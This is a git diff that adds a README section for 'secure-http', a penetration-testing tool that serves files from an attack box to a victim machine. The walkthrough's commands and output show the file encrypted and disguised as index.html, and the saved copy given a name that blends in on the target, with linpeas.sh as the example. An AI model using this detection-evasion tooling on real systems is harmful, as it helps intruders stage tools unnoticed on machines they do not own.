@@ -127,3 +127,100 @@ Enter Password: Passw0rd
 localhost--> help
 {Create | View | Add | Delete | Exit}
 ````
+## secure-http
+- Secure file sharing between your attack box and a victim machine.
+- Requires the client to check in with a secret key in order to be able to pull down the hosted file.
+- Whatever file you host it will be encrypted and served as `index.html` in order to better blend in with victim machines web traffic 
+- It never looks good if a victim machine is attempting to pull down `http://10.10.10.10:80/linpeas.sh`, `http://10.10.10.10:80/index.html` looks better 
+- The client will then ask you for the password to decrypt your file and it will save it off to what you specify 
+### server.py 
+- help
+````
+python3 server.py -h
+usage: server.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-v] [--version]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -i IPADDRESS, --ipaddress IPADDRESS
+  -p PORT, --port PORT
+  -f FILE, --file FILE
+  -v, --verbose         Verbosity (-v, -vv, etc)
+  --version             show program's version number and exit
+````
+### client.py 
+python3 client.py -h
+usage: client.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-b BLEND] [-v] [--version]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -i IPADDRESS, --ipaddress IPADDRESS
+                        The ip address to connect back to
+  -p PORT, --port PORT
+  -f FILE, --file FILE  The file to pull down, it will be the same as the server.py -f option
+  -b BLEND, --blend BLEND
+                        Decrypted out file name, make sure to pick something that blends on the target
+  -v, --verbose         Verbosity (-v, -vv, etc)
+  --version             show program's version number and exit
+  ````
+  ### Walkthrough 
+  - Host the file you want 
+  ````
+  [rocky@rocky http-server]$ python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
+🔨 Server hosting lipeas.sh as index.html at 10.0.0.3 on port 8080 🔨
+
+Run on the client (change the -b option to something that blends): 
+python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted
+````
+- Now request the file with the provided command 
+````
+python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
+receiving data...
+Success
+Connection closed
+
+Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1
+
+Enter password for decryption: 
+````
+- When a valid request comes in the server will show you the password to enter on the client side 
+````
+python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
+🔨 Server hosting linpeas.sh as index.html at 10.0.0.3 on port 8080 🔨
+
+Run on the client (change the -b option to something that blends): 
+python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted
+
+Got connection from ('10.0.0.3', 49510)
+Recieved Key: b'wK1NLC7DUO2N73E1AxGE'
+Your password to decrypt is: cuHscLbLvTFuyUForQwd
+Sent encrypted file with MD5: 8ab5d0c7f44936baadb414ad5435eed1
+````
+- Once the password is entered the client will tell you the file is decrypted and it will ne named whatever your `-b` parameter was set to 
+````
+[rocky@rocky secure-http]$ python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
+receiving data...
+Success
+Connection closed
+
+Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1
+
+Enter password for decryption: cuHscLbLvTFuyUForQwd
+File Decrypted
+````
+- The encrypted `index.html`
+````
+[rocky@rocky secure-http]$ head index.html 
+Salted__�Ť2����z7|�7��t�{vu���k��ߝ(*z�	�#��
+                                            �c�N�}w{�ISh{�L���W�?�ɾ���t����IpH>��%����~����vG@����Ff"�"���8e,u�2g��X��4:5JO�u�>��{�@'��6�Ȫb��� K�R�y��r���w(��7S1�#myQ���RK-|���H!�ӥ
+��
+  �����X���뺑;+�\p#�K#AH�������-[��	����u)EU��]�Pi�?���S#dV�E�������Ռ���e�[�9_�yu��+����
+````
+- The decrypted `linpeas.sh`
+````
+[rocky@rocky secure-http]$ head hidden-file 
+#!/bin/sh
+
+VERSION="ng"
+ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission."
+````
+
